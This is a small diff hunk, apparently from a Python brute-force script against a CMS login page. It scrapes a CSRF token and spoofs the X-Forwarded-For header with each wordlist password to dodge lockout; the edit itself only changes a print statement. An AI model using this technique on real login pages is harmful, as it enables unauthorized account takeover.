@@ -29,7 +29,7 @@ for password in wordlist:
     login_page = session.get(login_url)
     csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
 
-    print('[*] Trying: {p}'.format(p = password))
+    print(f'[*] Trying: {password}')
 
     headers = {
         'X-Forwarded-For': password,
